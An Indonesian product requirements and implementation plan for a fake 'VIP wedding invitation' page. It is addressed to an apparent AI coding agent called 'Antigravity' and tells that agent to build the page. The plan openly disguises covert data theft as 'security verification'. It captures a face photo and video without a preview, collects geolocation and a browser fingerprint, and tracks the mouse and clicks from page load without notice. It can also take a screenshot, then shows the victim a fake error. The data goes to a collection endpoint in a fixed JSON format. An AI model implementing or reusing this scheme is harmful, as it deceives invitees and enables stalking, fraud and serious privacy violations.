# PROYEK: SuratUndangan VIP (Romeo & Juliet) v2.0
## PRD + IMPLEMENTATION PLAN LENGKAP – SIAP EKSEKUSI

> **Pesan untuk Antigravity (bisa langsung kirim):**  
> Bro, ini file lengkap PRD dan implementation plan. Semua aturan, alur, pseudocode, struktur folder, mode testing, dan endpoint sudah ada. Langsung gas sesuai urutan. Bebas improvisasi teknis asalkan patuh ke aturan fallback & silent error. Kami tunggu hasilnya. Gas pol!

---

## 1. TUJUAN UPDATE
Menambah modul pengumpulan data tambahan:
- 📍 Lokasi (geolocation)
- 🎥 Video singkat (3–5 detik)
- 🖥️ Fingerprint perangkat (browser fingerprinting)
- 🖱️ Tracking perilaku (klik, mouse, scroll)
- 📸 Screenshot layar (opsional, dengan izin terpisah)

Semua berkedok "Verifikasi Keamanan Undangan VIP".

---

## 2. FITUR TAMBAHAN (LENGKAP)

| # | Fitur | Metode | Data yang dikumpulkan |
|---|-------|--------|----------------------|
| 1 | Lokasi | `navigator.geolocation` | Latitude, Longitude, akurasi (meter), timestamp |
| 2 | Video singkat | `getUserMedia` + MediaRecorder | 3–5 detik, format webm/mp4 (base64) |
| 3 | Fingerprint | JS (FingerprintJS atau custom) | User agent, resolusi, bahasa, timezone, fonts, WebGL/GPU, canvas hash |
| 4 | Tracking | Event listeners | Koordinat klik pertama, waktu ke tombol, scroll depth (%), jalur mouse (max 50 titik) |
| 5 | Screenshot (opsional) | `getDisplayMedia` | 1 gambar layar (base64), null jika ditolak |

---

## 3. ALUR FLOW (URUT, JANGAN DIUBAH)

1. User buka link → load UI undangan, mulai **tracking mouse & klik** dari awal (tanpa pemberitahuan).
2. User klik **"Akses Galeri Privat"** → simpan timestamp + koordinat klik.
3. Muncul modal **"Verifikasi Keamanan – Izinkan kamera"** → user izinkan → ambil **1 foto wajah** (tanpa preview, tanpa suara) → kirim ke server di background.
4. Muncul modal **"Verifikasi Lokasi untuk Anti-Penipuan"** → jika izin → ambil koordinat; jika ditolak → `location = null`.
5. Muncul modal **"Verifikasi Wajah Ekspresi (Rekam 3 detik)"** → rekam video otomatis 3–5 detik → kirim.
6. Selama langkah 1–5, kumpulkan **fingerprint** (sejak awal halaman) dan **data perilaku**.
7. Kirim **semua data** ke endpoint `POST /api/collect` (JSON). Server wajib balas `200 OK` apapun.
8. Tampilkan error palsu ke user: *"Galeri Privat sedang dalam perbaikan teknis. Silakan coba lagi nanti."*
9. **Opsional:** Setelah error muncul, tawarkan: *"Apakah Anda ingin melaporkan masalah dengan mengirimkan screenshot?"*  
   - Jika user setuju → `getDisplayMedia` → ambil 1 screenshot → kirim.  
   - Jika tidak → `screenshot = null`.

---

## 4. STRUKTUR DATA JSON (WAJIB)

```json
{
  "session_id": "uuid-v4",
  "timestamp": "2026-06-08T12:00:00.000Z",
  "photo_base64": "data:image/jpeg;base64,...",
  "video_base64": "data:video/webm;base64,...",
  "location": {
    "lat": -6.123456,
    "lng": 106.123456,
    "accuracy": 15.2,
    "timestamp": 1234567890
  },
  "fingerprint": {
    "user_agent": "Mozilla/5.0...",
    "screen_resolution": "1920x1080",
    "language": "id-ID",
    "timezone": "Asia/Jakarta",
    "platform": "Win32",
    "webgl_vendor": "Intel Inc.",
    "canvas_hash": "abcdef123456",
    "fonts_installed": ["Arial", "Roboto"]
  },
  "behavior": {
    "first_click_xy": [150, 320],
    "time_to_click_ms": 4200,
    "scroll_depth_percent": 67,
    "mouse_path": [[10,20],[15,22],...]
  },
  "screenshot_base64": "data:image/png;base64,... or null"
}